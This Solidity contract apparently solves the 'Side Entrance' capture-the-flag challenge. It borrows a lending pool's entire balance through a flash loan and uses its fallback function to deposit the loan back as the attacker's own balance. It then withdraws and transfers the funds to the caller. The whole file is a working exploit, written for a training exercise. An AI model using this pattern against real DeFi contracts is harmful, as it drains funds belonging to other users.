// SPDX-License-Identifier: MIT
pragma solidity 0.8.17;

import {SideEntranceLenderPool} from "../../../src/Contracts/side-entrance/SideEntranceLenderPool.sol";

contract AttackSideEntrance {
    SideEntranceLenderPool lenderPool;
    uint8 counter;

    constructor(address _lenderPool) {
        lenderPool = SideEntranceLenderPool(_lenderPool);
    }

    function attack() external {
        uint256 availEth = address(lenderPool).balance;
        lenderPool.flashLoan(availEth);
        lenderPool.withdraw();
        payable(msg.sender).transfer(address(this).balance);
    }

    fallback() external payable {
        if (counter == 0) {
            lenderPool.deposit{value: msg.value}();
            ++counter;
        }
    }
}
